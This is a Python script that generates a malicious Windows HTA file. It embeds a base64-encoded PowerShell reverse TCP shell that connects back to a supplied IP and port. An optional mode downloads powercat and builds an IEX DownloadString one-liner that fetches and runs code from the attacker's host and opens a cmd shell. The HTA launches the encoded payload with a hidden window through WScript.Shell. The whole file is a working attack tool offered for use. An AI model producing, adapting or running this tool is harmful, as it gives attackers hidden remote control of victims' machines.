#!/usr/bin/env python3

#Author: felamos 

import base64
import argparse
import os
import requests

def Main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="IP address", type=str)
    parser.add_argument("port", help="PORT", type=str)
    parser.add_argument("--nc", help="use nc.exe (if powershell don't work)", action="store_true")
    args = parser.parse_args()

    def reverse_shell(ip, port):
        #https://forums.hak5.org/topic/39754-reverse-tcp-shell-using-ms-powershell-only/
        rev_b64 = "IHdoaWxlICgxIC1lcSAxKQp7CiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ0NvbnRpbnVlJzsKICAgIHRyeQogICAgewogICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoIlNVUEVSSVBBIiwgUE9SVCk7CiAgICAgICAgJHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7CiAgICAgICAgW2J5dGVbXV0kYnl0ZXMgPSAwLi4yNTV8JXswfTsKICAgICAgICAkc2VuZGJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCJDbGllbnQgQ29ubmVjdGVkLi4uIisiYG5gbiIgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKTsKICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZXMsMCwkc2VuZGJ5dGVzLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpOwogICAgICAgIHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkKICAgICAgICB7CiAgICAgICAgICAgICRyZWNkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOwogICAgICAgICAgICBpZigkcmVjZGF0YS5TdGFydHNXaXRoKCJraWxsLWxpbmsiKSl7IGNsczsgJGNsaWVudC5DbG9zZSgpOyBleGl0O30KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNhdHRlbXB0IHRvIGV4ZWN1dGUgdGhlIHJlY2VpdmVkIGNvbW1hbmQKICAgICAgICAgICAgICAgICRzZW5kYmFjayA9IChpZXggJHJlY2RhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsKICAgICAgICAgICAgICAgICRzZW5kYmFjazIgID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICRlcnJvclswXS5JbnZvY2F0aW9uSW5mby5Qb3NpdGlvbk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAkc2VuZGJhY2syICA9ICAiRVJST1I6ICIgKyAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICJgbmBuIiArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7CiAgICAgICAgICAgICAgICBjbHM7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHJldHVybmJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgICAgICAgICAkc3RyZWFtLldyaXRlKCRyZXR1cm5ieXRlcywwLCRyZXR1cm5ieXRlcy5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKTsgICAgICAgICAgCiAgICAgICAgfQogICAgfQogICAgY2F0Y2ggCiAgICB7CiAgICAgICAgaWYoJGNsaWVudC5Db25uZWN0ZWQpCiAgICAgICAgewogICAgICAgICAgICAkY2xpZW50LkNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIGNsczsKICAgICAgICBTdGFydC1TbGVlcCAtcyAzMDsKICAgIH0gICAgIAp9IAo="
        rev_plain = base64.b64decode(rev_b64).decode()
        rev = rev_plain.replace("SUPERIPA" , ip).replace("PORT", port)
        payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
        return payload

    def nc_shell(ip, port):
        #https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
        if os.path.exists('powercat.ps1') != True:
            print("[*] Downloading powercat.ps1")
            r = requests.get("https://gist.githubusercontent.com/felamos/866ee131d73faed35816e478b4478665/raw/3ed29578281d4e55947ef3f272f9ad242a3c1246/powercat.ps1")
            with open("powercat.ps1", 'w', encoding = 'utf-8') as f:
                f.write(r.text)
                f.close()
        rev = f"""IEX(New-Object Net.WebClient).DownloadString('http://{ip}:8000/powercat.ps1');powercat -c {ip} -p {port} -e cmd"""
        print("[*] Please start your python http server on port 8000, i will fix this issue later")
        payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
        return payload
    
    def hta(payload):
        hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CmE9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKYS5ydW4oInBvd2Vyc2hlbGwgLW5vcCAtdyAxIC1lbmMgQkFTRTY0IiwgMCk7d2luZG93LmNsb3NlKCk7Cjwvc2NyaXB0Pgo8dGl0bGU+V2VpcmQgVGl0bGU8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8aDE+V0VJUkQgSFRBPC9oMT4KPGhyPgo8L2JvZHk+CjwvaHRtbD4KCg=="
        hta_plain = base64.b64decode(hta_b64).decode()
        hta = hta_plain.replace("BASE64" ,payload)
        with open("fela.hta",'w',encoding = 'utf-8') as f:
            f.write(hta)
            f.close()
        print("[*] Written fela.hta")
        
    if args.nc:
        payload = nc_shell(args.ip, args.port)
        hta(payload)
    else:
        payload = reverse_shell(args.ip, args.port)
        hta(payload)

if __name__ == "__main__":
    Main()
